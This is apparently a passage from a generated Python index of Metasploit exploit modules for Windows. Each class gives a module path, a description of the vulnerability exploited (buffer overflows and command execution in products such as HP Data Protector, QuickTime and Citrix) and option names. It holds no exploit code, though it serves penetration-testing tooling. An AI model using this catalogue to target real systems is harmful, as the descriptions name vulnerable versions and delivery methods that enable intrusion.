			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_misc_splayer_content_type(object):
		"""
		
          This module exploits a vulnerability in SPlayer v3.7 or piror.  When SPlayer
        requests the URL of a media file (video or audio), it is possible to gain arbitrary
        remote code execution due to a buffer overflow caused by an exceeding length of data
        as the 'Content-Type' parameter.
      
		"""

		path = 'windows/misc/splayer_content_type'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_misc_agentxpp_receive_agentx(object):
		"""
		
          This exploits a stack buffer overflow in the AgentX++ library, as used by
        various applications. By sending a specially crafted request, an attacker can
        execute arbitrary code, potentially with SYSTEM privileges.

        This module was tested successfully against master.exe as included with Real
        Network/'s Helix Server v12. When installed as a service with Helix Server,
        the service runs as SYSTEM, has no recovery action, but will start automatically
        on boot.

        This module does not work with NX/XD enabled but could be modified easily to
        do so. The address
      
		"""

		path = 'windows/misc/agentxpp_receive_agentx'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_apple_quicktime_rtsp_response(object):
		"""
		
          This module exploits a stack buffer overflow in Apple QuickTime 7.3. By sending an overly long
        RTSP response to a client, an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/misc/apple_quicktime_rtsp_response'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_ibm_tsm_rca_dicugetidentify(object):
		"""
		
          This module exploits a stack buffer overflow in the IBM Tivoli Storage Manager Express Remote
        Client Agent service. By sending a "dicuGetIdentify" request packet containing a long
        NodeName parameter, an attacker can execute arbitrary code.

        NOTE: this exploit first connects to the CAD service to start the RCA service and obtain
        the port number on which it runs. This service does not restart.
      
		"""

		path = 'windows/misc/ibm_tsm_rca_dicugetidentify'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_lianja_db_net(object):
		"""
		
          This module exploits a stack buffer overflow in the db_netserver process, which
        is spawned by the Lianja SQL server.  The issue is fixed in Lianja SQL 1.0.0RC5.2.
      
		"""

		path = 'windows/misc/lianja_db_net'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_sap_2005_license(object):
		"""
		
          This module exploits a stack buffer overflow in the SAP Business One 2005
          License Manager 'NT Naming Service' A and B releases. By sending an
          excessively long string the stack is overwritten enabling arbitrary
          code execution.
      
		"""

		path = 'windows/misc/sap_2005_license'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_ibm_cognos_tm1admsd_bof(object):
		"""
		
          This module exploits a stack buffer overflow in IBM Cognos Analytic Server
        Admin service. The vulnerability exists in the tm1admsd.exe component, due to a
        dangerous copy of user controlled data to the stack, via memcpy, without validating
        the supplied length and data. The module has been tested successfully on IBM Cognos
        Express 9.5 over Windows XP SP3.
      
		"""

		path = 'windows/misc/ibm_cognos_tm1admsd_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_stream_down_bof(object):
		"""
		
        Stream Down 6.8.0 seh based buffer overflow triggered when processing
        the server reponse packet.During the overflow a structured exception
        handler is overwritten.
      
		"""

		path = 'windows/misc/stream_down_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'

	class windows_misc_hp_dataprotector_cmd_exec(object):
		"""
		
        This module exploits a remote command execution on HP Data Protector 8.10. Arbitrary
        commands can be execute by sending crafted requests with opcode 28 to the OmniInet
        service listening on the TCP/5555 port. Since there is an strict length limitation on
        the command, rundll32.exe is executed, and the payload is provided through a DLL by a
        fake SMB server. This module has been tested successfully on HP Data Protector 8.1 on
        Windows 7 SP1.
      
		"""

		path = 'windows/misc/hp_dataprotector_cmd_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			required_SMBServerMaximumBuffer = 'SMBServerMaximumBuffer'
			required_SMBServerIdleTimeout = 'SMBServerIdleTimeout'
			SHARE = 'SHARE'
			FILE_NAME = 'FILE_NAME'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_SMB_DELAY = 'SMB_DELAY'

	class windows_misc_citrix_streamprocess(object):
		"""
		
          This module exploits a stack buffer overflow in Citrix Provisioning Services 5.6.
        By sending a specially crafted packet to the Provisioning Services server, a fixed
        length buffer on the stack can be overflowed and arbitrary code can be executed.
      
		"""

		path = 'windows/misc/citrix_streamprocess'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'

	class windows_misc_ms07_064_sami(object):
		"""
		
          This module exploits a stack buffer overflow in the DirectShow Synchronized
        Accessible Media Interchanged (SAMI) parser in quartz.dll. This module
        has only been tested with Windows Media Player (6.4.09.1129) and
        DirectX 8.0.
      
		"""

		path = 'windows/misc/ms07_064_sami'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_bopup_comm(object):
		"""
		
          This module exploits a stack buffer overflow in Bopup Communications Server 3.2.26.5460.
          By sending a specially crafted packet, an attacker may be
          able to execute arbitrary code.
      
		"""

		path = 'windows/misc/bopup_comm'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_asus_dpcproxy_overflow(object):
		"""
		
          This module exploits a stack buffer overflow in Asus Dpcroxy version 2.0.0.19.
          It should be vulnerable until version 2.0.0.24.
          Credit to Luigi Auriemma
      
		"""

		path = 'windows/misc/asus_dpcproxy_overflow'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_landesk_aolnsrvr(object):
		"""
		
        This module exploits a stack buffer overflow in LANDesk Management Suite 8.7. By sending
        an overly long string to the Alert Service, a buffer is overwritten and arbitrary
        code can be executed.
      
		"""

		path = 'windows/misc/landesk_aolnsrvr'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'

	class windows_misc_ibm_director_cim_dllinject(object):
		"""
		
          This module abuses the "wmicimsv" service on IBM System Director Agent 5.20.3
        to accomplish arbitrary DLL injection and execute arbitrary code with SYSTEM
        privileges.

        In order to accomplish remote DLL injection it uses a WebDAV service as disclosed
        by kingcope on December 2012. Because of this, the target host must have the
        WebClient service (WebDAV Mini-Redirector) enabled. It is enabled and automatically
        started by default on Windows XP SP3, but disabled by default on Windows 2003 SP2.
      
		"""

		path = 'windows/misc/ibm_director_cim_dllinject'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_misc_hp_dataprotector_exec_bar(object):
		"""
		
        This module abuses the Backup Client Service (OmniInet.exe) to achieve remote code
        execution. The vulnerability exists in the EXEC_BAR operation, which allows to
        execute arbitrary processes. This module has been tested successfully on HP Data
        Protector 6.20 on Windows 2003 SP2 and Windows 2008 R2.
      
		"""

		path = 'windows/misc/hp_dataprotector_exec_bar'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			CMDSTAGER_DECODER = 'CMDSTAGER::DECODER'
			required_CMDPATH = 'CMDPATH'

	class windows_misc_bomberclone_overflow(object):
		"""
		
          This module exploits a stack buffer overflow in Bomberclone 0.11.6 for Windows.
        The return address is overwritten with lstrcpyA memory address,
        the second and third value are the destination buffer,
        the fourth value is the source address of our buffer in the stack.
        This exploit is like a return in libc.

        ATTENTION
        The shellcode is exec ONLY when someone try to close bomberclone.
      
		"""

		path = 'windows/misc/bomberclone_overflow'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'

	class windows_misc_avaya_winpmd_unihostrouter(object):
		"""
		
          This module exploits a stack buffer overflow in Avaya WinPMD. The vulnerability
        exists in the UniteHostRouter service, due to the insecure usage of memcpy when
        parsing specially crafted "To:" headers. The module has been tested successfully on
        Avaya WinPMD 3.8.2 over Windows XP SP3 and Windows 2003 SP2.
      
		"""

		path = 'windows/misc/avaya_winpmd_unihostrouter'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'

	class windows_misc_shixxnote_font(object):
		"""
		
          This module exploits a buffer overflow in ShixxNOTE 6.net.
        The vulnerability is caused due to boundary errors in the
        handling of font fields.
      
		"""

		path = 'windows/misc/shixxnote_font'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_misc_bigant_server(object):
		"""
		
          This module exploits a stack buffer overflow in BigAnt Server 2.2.
        By sending a specially crafted packet, an attacker may be
        able to execute arbitrary code.
      
		"""

		path = 'windows/misc/bigant_server'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_misc_trendmicro_cmdprocessor_addtask(object):
		"""
		
          This module exploits a vulnerability in the CmdProcessor.exe component of Trend
        Micro Control Manger up to version 5.5.

          The specific flaw exists within CmdProcessor.exe service running on TCP port
        20101. The vulnerable function is the CGenericScheduler::AddTask function of
        cmdHandlerRedAlertController.dll. When processing a specially crafted IPC packet,
        controlled data is copied into a 256-byte stack buffer. This can be exploited
        to execute remote code under the context of the user.
      
		"""

		path = 'windows/misc/trendmicro_cmdprocessor_addtask'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_hp_dataprotector_install_service(object):
		"""
		
        This module exploits HP Data Protector Omniinet process on Windows only.
        This exploit invokes the install service function which allows an attacker to create a
        custom payload in the format of an executable.

        To ensure this works, the SMB server created in MSF must have a share called Omniback
        which has a subfolder i386, i.e. //192.168.1.1/Omniback/i386/
      
		"""

		path = 'windows/misc/hp_dataprotector_install_service'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			required_SMBServerMaximumBuffer = 'SMBServerMaximumBuffer'
			required_SMBServerIdleTimeout = 'SMBServerIdleTimeout'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_SMB_DELAY = 'SMB_DELAY'

	class windows_misc_enterasys_netsight_syslog_bof(object):
		"""
		
          This module exploits a stack buffer overflow in Enterasys NetSight. The
        vulnerability exists in the Syslog service (nssylogd.exe) when parsing a specially
        crafted PRIO from a syslog message. The module has been tested successfully on
        Enterasys NetSight 4.0.1.34 over Windows XP SP3 and Windows 2003 SP2.
      
		"""

		path = 'windows/misc/enterasys_netsight_syslog_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'

	class windows_misc_wireshark_lua(object):
		"""
		
          This modules exploits a vulnerability in Wireshark 1.6 or less. When opening a
        pcap file, Wireshark will actually check if there's a 'console.lua' file in the same
        directory, and then parse/execute the script if found.  Versions affected by this
        vulnerability: 1.6.0 to 1.6.1, 1.4.0 to 1.4.8
      
		"""

		path = 'windows/misc/wireshark_lua'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSLCert = 'SSLCert'
